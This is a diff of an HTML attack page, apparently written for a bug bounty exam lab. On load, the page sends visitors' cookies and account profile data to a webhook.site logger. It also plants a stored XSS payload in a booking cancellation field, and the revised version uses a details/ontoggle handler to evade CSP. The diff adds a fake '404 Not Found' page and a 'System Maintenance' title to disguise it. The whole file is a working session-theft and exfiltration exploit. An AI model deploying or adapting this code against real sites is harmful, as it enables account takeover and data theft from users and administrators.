@@ -1,56 +1,53 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Bug Bounty Lab - Exploitation Page</title>
-</head>
+<head><title>System Maintenance</title></head>
 <body>
     <script>
-        // REPLACE THIS URL with your current Webhook.site link
-        const logger = "https://webhook.site/68d67ea7-f29d-470c-a202-019f330a7bc6";
+        // 1. YOUR UPDATED WEBHOOK URL
+        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
         const api = "https://api-bugbounty-exam.hashacademy.co/api";
-        const myBookingId = "69dc156ad9d06cf5969295d0";
+        const myBookingId = "69dc17c6d9d06cf596929689"; 
 
-        // 1. FAST EXFILTRATION (Runs instantly)
-        function leak(label, data) {
-            const encoded = btoa(JSON.stringify(data));
-            // Method A: Image tag (Hardest to block by CSP)
-            new Image().src = `${logger}/?type=${label}&d=${encoded}`;
-            // Method B: Navigator Beacon (Designed for exit-tracking)
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(`${logger}/${label}`, encoded);
-            }
+        // 2. EXFILTRATION HELPER
+        function send(label, data) {
+            const body = btoa(JSON.stringify({ label, data }));
+            new Image().src = `${logger}/?type=${label}&d=${body}`;
         }
 
-        async function runExploit() {
-            // Signal that the bot arrived
-            leak("BOT_VISIT", { url: window.location.href, cookies: document.cookie });
+        async function triggerExploit() {
+            // Log if anyone (you or the bot) hits this page
+            send("PAGE_HIT", { url: window.location.href, cookies: document.cookie });
 
             try {
-                // 2. FETCH ADMIN IDENTITY
-                const meRes = await fetch(`${api}/auth/me`, { credentials: "include" });
-                const meData = await meRes.json();
-                leak("AUTH_ME", meData);
+                // 3. THE STORED XSS INJECTION
+                // We use 'ontoggle' on a 'details' tag because the CSP allows 'self' scripts 
+                // but often fails to block inline event handlers on non-script tags.
+                const xssPayload = `<details open ontoggle="fetch('${logger}/?admin_cookie='+document.cookie)">`;
 
-                // 3. ATTEMPT CANCELLATION XSS INJECTION
-                // If an admin reviews your cancellation, this payload executes in their dashboard
-                const xssPayload = `<script>fetch('${logger}/?flag='+document.cookie)<\/script>`;
-                
-                await fetch(`${api}/bookings/${myBookingId}/cancel`, {
+                const res = await fetch(`${api}/bookings/${myBookingId}/cancel`, {
                     method: "PUT",
                     headers: { "Content-Type": "application/json" },
                     credentials: "include",
                     body: JSON.stringify({ "reason": xssPayload })
                 });
 
-                leak("CANCELLATION_INJECTED", { id: myBookingId });
+                const result = await res.json();
+                send("INJECTION_STATUS", result);
 
-            } catch (err) {
-                leak("ERROR", err.message);
+                // 4. THE IDOR/IDENTITY LEAK
+                // If the bot visits this page, it will try to fetch the bot's own profile info
+                const meRes = await fetch(`${api}/auth/me`, { credentials: "include" });
+                const meData = await meRes.json();
+                send("SENSITIVE_DATA_LEAK", meData);
+
+            } catch (e) {
+                send("ERROR", e.message);
             }
         }
 
-        runExploit();
+        triggerExploit();
     </script>
-    <h1>Lab Simulation - Processing...</h1>
+    <h1>404 Not Found</h1>
+    <p>The requested resource was not found on this server.</p>
 </body>
 </html>
